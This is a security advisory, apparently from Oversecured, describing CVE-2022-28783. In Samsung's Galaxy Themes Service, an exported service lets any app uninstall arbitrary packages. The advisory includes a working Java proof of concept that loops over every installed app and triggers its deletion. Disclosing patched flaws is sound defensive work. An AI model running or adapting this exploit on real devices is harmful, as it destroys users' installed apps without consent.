# Details

<table>
    <tr>
        <td>Name</td>
        <td>Galaxy Themes Service</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.themecenter</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.02.13</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.05.03</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28783">CVE-2022-28783</a> (SVE-2022-0349)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$5580</td>
    </tr>
</table>

# Description

Oversecured found the following vulnerability:
![](04%20رئيسية/Samsung%20Vulnerabilities/003.%20Galaxy%20Themes%20Service%20—%20Uninstalling%20arbitrary%20apps/Oversecured_report.png)

The `com.samsung.android.thememanager.ThemeManagerService` service was exported and allowed any third-party apps to communicate with it. When the attacker provided the `com.samsung.android.theme.action.SIDELOAD_AOD_END` action, the app received the `extra_package` value and passed it to `PackageManager.deletePackage()`. This allowed an unprivileged attacker to delete any apps installed on the device.

**Proof of Concept**
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    for (ApplicationInfo info : getPackageManager().getInstalledApplications(0)) {
        String pkg = info.packageName;
        if (!getPackageName().equals(pkg)) {
            deletePackage(pkg);
        }
    }
}

private void deletePackage(String pkg) {
    Bundle bundle = new Bundle();
    bundle.putString("extra_package", pkg);

    Intent i = new Intent("com.samsung.android.theme.action.SIDELOAD_AOD_END");
    i.setClassName("com.samsung.android.themecenter", "com.samsung.android.thememanager.ThemeManagerService");
    i.putExtra("extra_bundle", bundle);
    startService(i);
}
```
